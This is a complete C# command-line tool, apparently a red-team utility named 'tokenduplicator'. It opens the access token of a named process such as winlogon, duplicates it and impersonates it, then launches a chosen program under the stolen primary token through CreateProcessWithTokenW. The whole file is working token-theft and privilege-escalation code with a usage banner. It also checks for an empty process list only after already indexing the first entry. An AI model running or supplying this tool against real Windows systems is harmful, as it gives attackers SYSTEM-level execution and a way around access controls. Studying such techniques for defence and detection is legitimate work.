using System;
using System.Security.Principal;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace tokenduplicator
{
    class Program
    {

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            UInt32 DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("advapi32.dll")]
        public static extern bool DuplicateToken(
            IntPtr ExistingTokenHandle,
            int SECURITY_IMPERSONATION_LEVEL,
            ref IntPtr DuplicateTokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(
            IntPtr hToken);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int Length;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        public enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            ref SECURITY_ATTRIBUTES lpTokenAttributes,
            int SECURITY_IMPERSONATION_LEVEL,
            TOKEN_TYPE TokenType,
            out IntPtr phNewToken);

        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }

        [DllImport("advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CreateProcessWithTokenW(
            IntPtr hToken,
            LogonFlags dwLogonFlags,
            string lpApplicationName,
            string lpCommandLine,
            CreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void Main(string[] args)
        {



            string ascii = @" _____     _              ____          _ _         _           
|_   _|___| |_ ___ ___   |    \ _ _ ___| |_|___ ___| |_ ___ ___ 
  | | | . | '_| -_|   |  |  |  | | | . | | |  _| .'|  _| . |  _|
  |_| |___|_,_|___|_|_|  |____/|___|  _|_|_|___|__,|_| |___|_|  
                                   |_|
                ... for all your token duplication needs!";

            Console.WriteLine(ascii + "\n\n");

            if (args.Length != 2)
            {
                Console.WriteLine("Usage  : " + System.AppDomain.CurrentDomain.FriendlyName + " <process to duplicate token from> <process to execute with duplicated token>");
                Console.WriteLine("example: " + System.AppDomain.CurrentDomain.FriendlyName + " winlogon C:\\Windows\\System32\\Taskmgr.exe");

                return;
            }

            String processToDuplicateTokenFrom = args[0];
            string processToStartWithDuplicatedToken = args[1];

            Console.WriteLine("[ ] Will attempt to start " + processToStartWithDuplicatedToken + " with a duplicated token from " + processToDuplicateTokenFrom);

            if (!IsHighIntegrity())
            {
                Console.WriteLine("[!] Not running in high integrity");
                return;
            }

            Console.WriteLine("[+] Running in high integrity");

            Process[] processes = Process.GetProcessesByName(processToDuplicateTokenFrom);
            IntPtr handle = processes[0].Handle;

            if (processes.Length == 0)
            {
                Console.WriteLine("[!] Did not find any process with the name " + processToDuplicateTokenFrom);
                return;
            }

            if (processes.Length > 1)
            {
                Console.WriteLine("[!] More than one process found.. I'm just gonna go for the first one.. YOLO");
            }

            Console.WriteLine("[+] Got handle for " + processToDuplicateTokenFrom + ": " + handle);

            IntPtr hToken = IntPtr.Zero;
            // TOKEN_DUPLICATE = 0x0002
            if (!OpenProcessToken(handle, 0x0002, out hToken))
            {
                Console.WriteLine("[!] OpenProcessToken with TOKEN_DUPLICATE access failed");
                return;
            }

            Console.WriteLine("[+] Successfully opened the process token with TOKEN_DUPLICATE access. Handle: " + hToken);

            // 2 == SecurityImpersonation
            IntPtr hDupToken = IntPtr.Zero;
            if (!DuplicateToken(hToken, 2, ref hDupToken))
            {
                Console.WriteLine("[!] DuplicateToken with SecurityImpersonation failed");
                return;
            }

            Console.WriteLine("[+] Successfully duplicated the process token with SecurityImpersonation access.\n    This token will be used to impersonate the security context of " + processToDuplicateTokenFrom + ".\n    Handle for new duplicate token: " + hDupToken);

            if (!ImpersonateLoggedOnUser(hDupToken))
            {
                Console.WriteLine("[!] ImpersonateLoggedOnUser with the duplicate token failed");
                return;
            }

            Console.WriteLine("[+] Impersonation of " + processToDuplicateTokenFrom + "'s security context succeeded with a call to ImpersonateLoggedOnUser() using the duplicate token");

            STARTUPINFO sui = new STARTUPINFO();
            sui.dwFlags = 1;
            sui.wShowWindow = 1;


            PROCESS_INFORMATION pi;
            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();

            IntPtr hDupDupToken = IntPtr.Zero;
            // MAXIMUM_ALLOWED = 0x2000000

            if (!DuplicateTokenEx(hToken, 0x2000000, ref sa, 2, TOKEN_TYPE.TokenPrimary, out hDupDupToken))
            {
                Console.WriteLine("[!] The attempt to duplicating the token (again) with the MAXIUM_ALLOWED access rights and as a primary token failed.");
                return;
            }

            Console.WriteLine("[+] The attempt to duplicate the process token a second time with the MAXIMUM_ALLOWED access rights and as a primary token succeeded.\n    Handle to the new duplicate token: " + hDupDupToken);

            if (!CreateProcessWithTokenW(hDupDupToken,
                LogonFlags.NetCredentialsOnly,
                null,
                processToStartWithDuplicatedToken,
                CreationFlags.DefaultErrorMode,
                (IntPtr)0,
                null,
                ref sui,
                out pi))
            {
                var lastError = GetLastError();
                Console.WriteLine("[!] CreateProcessWithTokenW error: {0}", lastError);
                return;
            }

            Console.WriteLine("[+] " + processToStartWithDuplicatedToken + " successfully executed. Pid: " + pi.dwProcessId.ToString());
        }
    }
}
